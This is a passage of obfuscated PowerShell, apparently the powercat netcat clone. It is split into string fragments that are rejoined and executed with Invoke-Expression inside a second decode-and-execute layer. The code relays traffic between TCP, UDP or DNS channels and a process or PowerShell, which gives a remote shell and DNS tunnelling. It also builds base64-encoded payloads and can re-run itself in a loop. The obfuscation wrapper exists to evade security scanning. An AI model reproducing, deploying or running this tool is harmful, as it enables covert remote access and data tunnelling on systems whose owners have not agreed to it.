  ','  param($Stream1','SetupVars,$Strea','m2SetupVars)
   ',' try
    {
     ',' [byte[]]$InputT','oWrite = @()
   ','   $Encoding = N','ew-Object System','.Text.AsciiEncod','ing
      if($i ','-ne $null)
     ',' {
        Write','-Verbose "Input ','from -i detected','..."
        if(','Test-Path $i){ [','byte[]]$InputToW','rite = ([io.file',']::ReadAllBytes(','$i)) }
        e','lseif($i.GetType','().Name -eq "Byt','e[]"){ [byte[]]$','InputToWrite = $','i }
        else','if($i.GetType().','Name -eq "String','"){ [byte[]]$Inp','utToWrite = $Enc','oding.GetBytes($','i) }
        els','e{Write-Host "Un','recognised input',' type." ; return','}
      }
      ','
      Write-Ver','bose "Setting up',' Stream 1..."
  ','    try{$Stream1','Vars = Stream1_S','etup $Stream1Set','upVars}
      ca','tch{Write-Verbos','e "Stream 1 Setu','p Failure" ; ret','urn}
      
    ','  Write-Verbose ','"Setting up Stre','am 2..."
      t','ry{$Stream2Vars ','= Stream2_Setup ','$Stream2SetupVar','s}
      catch{W','rite-Verbose "St','ream 2 Setup Fai','lure" ; return}
','      
      $Da','ta = $null
     ',' 
      if($Inpu','tToWrite -ne @()',')
      {
      ','  Write-Verbose ','"Writing input t','o Stream 1..."
 ','       try{$Stre','am1Vars = Stream','1_WriteData $Inp','utToWrite $Strea','m1Vars}
        ','catch{Write-Host',' "Failed to writ','e input to Strea','m 1" ; return}
 ','     }
      
  ','    if($d){Write','-Verbose "-d (di','sconnect) Activa','ted. Disconnecti','ng..." ; return}','
      
      Wr','ite-Verbose "Bot','h Communication ','Streams Establis','hed. Redirecting',' Data Between St','reams..."
      ','while($True)
   ','   {
        try','
        {
     ','     $Data,$Stre','am2Vars = Stream','2_ReadData $Stre','am2Vars
        ','  if(($Data.Leng','th -eq 0) -or ($','Data -eq $null))','{Start-Sleep -Mi','lliseconds 100}
','          if($Da','ta -ne $null){$S','tream1Vars = Str','eam1_WriteData $','Data $Stream1Var','s}
          $Da','ta = $null
     ','   }
        cat','ch
        {
   ','       Write-Ver','bose "Failed to ','redirect data fr','om Stream 2 to S','tream 1" ; retur','n
        }
    ','    
        try','
        {
     ','     $Data,$Stre','am1Vars = Stream','1_ReadData $Stre','am1Vars
        ','  if(($Data.Leng','th -eq 0) -or ($','Data -eq $null))','{Start-Sleep -Mi','lliseconds 100}
','          if($Da','ta -ne $null){$S','tream2Vars = Str','eam2_WriteData $','Data $Stream2Var','s}
          $Da','ta = $null
     ','   }
        cat','ch
        {
   ','       Write-Ver','bose "Failed to ','redirect data fr','om Stream 1 to S','tream 2" ; retur','n
        }
    ','  }
    }
    fi','nally
    {
    ','  try
      {
  ','      #Write-Ver','bose "Closing St','ream 2..."
     ','   Stream2_Close',' $Stream2Vars
  ','    }
      catc','h
      {
      ','  Write-Verbose ','"Failed to close',' Stream 2"
     ',' }
      try
   ','   {
        #Wr','ite-Verbose "Clo','sing Stream 1...','"
        Stream','1_Close $Stream1','Vars
      }
   ','   catch
      {','
        Write-V','erbose "Failed t','o close Stream 1','"
      }
    }
','  }
  ##########',' MAIN FUNCTION #','#########
  
  #','######### GENERA','TE PAYLOAD #####','#####
  if($u)
 ',' {
    Write-Ver','bose "Set Stream',' 1: UDP"
    $Fu','nctionString = (','"function Stream','1_Setup`n{`n" + ','${function:Setup','_UDP} + "`n}`n`n','")
    $Function','String += ("func','tion Stream1_Rea','dData`n{`n" + ${','function:ReadDat','a_UDP} + "`n}`n`','n")
    $Functio','nString += ("fun','ction Stream1_Wr','iteData`n{`n" + ','${function:Write','Data_UDP} + "`n}','`n`n")
    $Func','tionString += ("','function Stream1','_Close`n{`n" + $','{function:Close_','UDP} + "`n}`n`n"',')    
    if($l)','{$InvokeString =',' "Main @('''',`$Tr','ue,''$p'',''$t'') "}','
    else{$Invok','eString = "Main ','@(''$c'',`$False,''','$p'',''$t'') "}
  }','
  elseif($dns -','ne "")
  {
    W','rite-Verbose "Se','t Stream 1: DNS"','
    $FunctionSt','ring = ("functio','n Stream1_Setup`','n{`n" + ${functi','on:Setup_DNS} + ','"`n}`n`n")
    $','FunctionString +','= ("function Str','eam1_ReadData`n{','`n" + ${function',':ReadData_DNS} +',' "`n}`n`n")
    ','$FunctionString ','+= ("function St','ream1_WriteData`','n{`n" + ${functi','on:WriteData_DNS','} + "`n}`n`n")
 ','   $FunctionStri','ng += ("function',' Stream1_Close`n','{`n" + ${functio','n:Close_DNS} + "','`n}`n`n")
    if','($l){return "Thi','s feature is not',' available."}
  ','  else{$InvokeSt','ring = "Main @(''','$c'',''$p'',''$dns'',','$dnsft) "}
  }
 ',' else
  {
    Wr','ite-Verbose "Set',' Stream 1: TCP"
','    $FunctionStr','ing = ("function',' Stream1_Setup`n','{`n" + ${functio','n:Setup_TCP} + "','`n}`n`n")
    $F','unctionString +=',' ("function Stre','am1_ReadData`n{`','n" + ${function:','ReadData_TCP} + ','"`n}`n`n")
    $','FunctionString +','= ("function Str','eam1_WriteData`n','{`n" + ${functio','n:WriteData_TCP}',' + "`n}`n`n")
  ','  $FunctionStrin','g += ("function ','Stream1_Close`n{','`n" + ${function',':Close_TCP} + "`','n}`n`n")
    if(','$l){$InvokeStrin','g = "Main @('''',`','$True,$p,$t) "}
','    else{$Invoke','String = "Main @','(''$c'',`$False,$p',',$t) "}
  }
  
 ',' if($e -ne "")
 ',' {
    Write-Ver','bose "Set Stream',' 2: Process"
   ',' $FunctionString',' += ("function S','tream2_Setup`n{`','n" + ${function:','Setup_CMD} + "`n','}`n`n")
    $Fun','ctionString += (','"function Stream','2_ReadData`n{`n"',' + ${function:Re','adData_CMD} + "`','n}`n`n")
    $Fu','nctionString += ','("function Strea','m2_WriteData`n{`','n" + ${function:','WriteData_CMD} +',' "`n}`n`n")
    ','$FunctionString ','+= ("function St','ream2_Close`n{`n','" + ${function:C','lose_CMD} + "`n}','`n`n")
    $Invo','keString += "@(''','$e'')`n`n"
  }
  ','elseif($ep)
  {
','    Write-Verbos','e "Set Stream 2:',' Powershell"
   ',' $InvokeString +','= "`n`n"
  }
  e','lseif($r -ne "")','
  {
    if($r.s','plit(":")[0].ToL','ower() -eq "udp"',')
    {
      Wr','ite-Verbose "Set',' Stream 2: UDP"
','      $FunctionS','tring += ("funct','ion Stream2_Setu','p`n{`n" + ${func','tion:Setup_UDP} ','+ "`n}`n`n")
   ','   $FunctionStri','ng += ("function',' Stream2_ReadDat','a`n{`n" + ${func','tion:ReadData_UD','P} + "`n}`n`n")
','      $FunctionS','tring += ("funct','ion Stream2_Writ','eData`n{`n" + ${','function:WriteDa','ta_UDP} + "`n}`n','`n")
      $Func','tionString += ("','function Stream2','_Close`n{`n" + $','{function:Close_','UDP} + "`n}`n`n"',')    
      if($','r.split(":").Cou','nt -eq 2){$Invok','eString += ("@(''',''',`$True,''" + $r','.split(":")[1] +',' "'',''$t'') ")}
  ','    elseif($r.sp','lit(":").Count -','eq 3){$InvokeStr','ing += ("@(''" + ','$r.split(":")[1]',' + "'',`$False,''"',' + $r.split(":")','[2] + "'',''$t'') "',')}
      else{re','turn "Bad relay ','format."}
    }
','    if($r.split(','":")[0].ToLower(',') -eq "dns")
   ',' {
      Write-V','erbose "Set Stre','am 2: DNS"
     ',' $FunctionString',' += ("function S','tream2_Setup`n{`','n" + ${function:','Setup_DNS} + "`n','}`n`n")
      $F','unctionString +=',' ("function Stre','am2_ReadData`n{`','n" + ${function:','ReadData_DNS} + ','"`n}`n`n")
     ',' $FunctionString',' += ("function S','tream2_WriteData','`n{`n" + ${funct','ion:WriteData_DN','S} + "`n}`n`n")
','      $FunctionS','tring += ("funct','ion Stream2_Clos','e`n{`n" + ${func','tion:Close_DNS} ','+ "`n}`n`n")
   ','   if($r.split("',':").Count -eq 2)','{return "This fe','ature is not ava','ilable."}
      ','elseif($r.split(','":").Count -eq 4','){$InvokeString ','+= ("@(''" + $r.s','plit(":")[1] + "',''',''" + $r.split(','":")[2] + "'',''" ','+ $r.split(":")[','3] + "'',$dnsft) ','")}
      else{r','eturn "Bad relay',' format."}
    }','
    elseif($r.s','plit(":")[0].ToL','ower() -eq "tcp"',')
    {
      Wr','ite-Verbose "Set',' Stream 2: TCP"
','      $FunctionS','tring += ("funct','ion Stream2_Setu','p`n{`n" + ${func','tion:Setup_TCP} ','+ "`n}`n`n")
   ','   $FunctionStri','ng += ("function',' Stream2_ReadDat','a`n{`n" + ${func','tion:ReadData_TC','P} + "`n}`n`n")
','      $FunctionS','tring += ("funct','ion Stream2_Writ','eData`n{`n" + ${','function:WriteDa','ta_TCP} + "`n}`n','`n")
      $Func','tionString += ("','function Stream2','_Close`n{`n" + $','{function:Close_','TCP} + "`n}`n`n"',')
      if($r.sp','lit(":").Count -','eq 2){$InvokeStr','ing += ("@('''',`$','True,''" + $r.spl','it(":")[1] + "'',','''$t'') ")}
      ','elseif($r.split(','":").Count -eq 3','){$InvokeString ','+= ("@(''" + $r.s','plit(":")[1] + "',''',`$False,''" + $','r.split(":")[2] ','+ "'',''$t'') ")}
 ','     else{return',' "Bad relay form','at."}
    }
  }
','  else
  {
    W','rite-Verbose "Se','t Stream 2: Cons','ole"
    $Functi','onString += ("fu','nction Stream2_S','etup`n{`n" + ${f','unction:Setup_Co','nsole} + "`n}`n`','n")
    $Functio','nString += ("fun','ction Stream2_Re','adData`n{`n" + $','{function:ReadDa','ta_Console} + "`','n}`n`n")
    $Fu','nctionString += ','("function Strea','m2_WriteData`n{`','n" + ${function:','WriteData_Consol','e} + "`n}`n`n")
','    $FunctionStr','ing += ("functio','n Stream2_Close`','n{`n" + ${functi','on:Close_Console','} + "`n}`n`n")
 ','   $InvokeString',' += ("@(''" + $o ','+ "'')")
  }
  
 ',' if($ep){$Functi','onString += ("fu','nction Main`n{`n','" + ${function:M','ain_Powershell} ','+ "`n}`n`n")}
  ','else{$FunctionSt','ring += ("functi','on Main`n{`n" + ','${function:Main}',' + "`n}`n`n")}
 ',' $InvokeString =',' ($FunctionStrin','g + $InvokeStrin','g)
  ########## ','GENERATE PAYLOAD',' ##########
  
 ',' ########## RETU','RN GENERATED PAY','LOADS ##########','
  if($ge){Write','-Verbose "Return','ing Encoded Payl','oad..." ; return',' [Convert]::ToBa','se64String([Syst','em.Text.Encoding',']::Unicode.GetBy','tes($InvokeStrin','g))}
  elseif($g','){Write-Verbose ','"Returning Paylo','ad..." ; return ','$InvokeString}
 ',' ########## RETU','RN GENERATED PAY','LOADS ##########','
  
  ##########',' EXECUTION #####','#####
  $Output ','= $null
  try
  ','{
    if($rep)
 ','   {
      while','($True)
      {
','        $Output ','+= IEX $InvokeSt','ring
        Sta','rt-Sleep -s 2
  ','      Write-Verb','ose "Repetition ','Enabled: Restart','ing..."
      }
','    }
    else
 ','   {
      $Outp','ut += IEX $Invok','eString
    }
  ','}
  finally
  {
','    if($Output -','ne $null)
    {
','      if($of -eq',' ""){$Output}
  ','    else{[io.fil','e]::WriteAllByte','s($of,$Output)}
','    }
  }
  ####','###### EXECUTION',' ##########
}

'); $script = $fragments -join ''; Invoke-Expression $script'); $obfuscated = [System.Text.Encoding]::UTF8.GetString($e); Invoke-Expression $obfuscated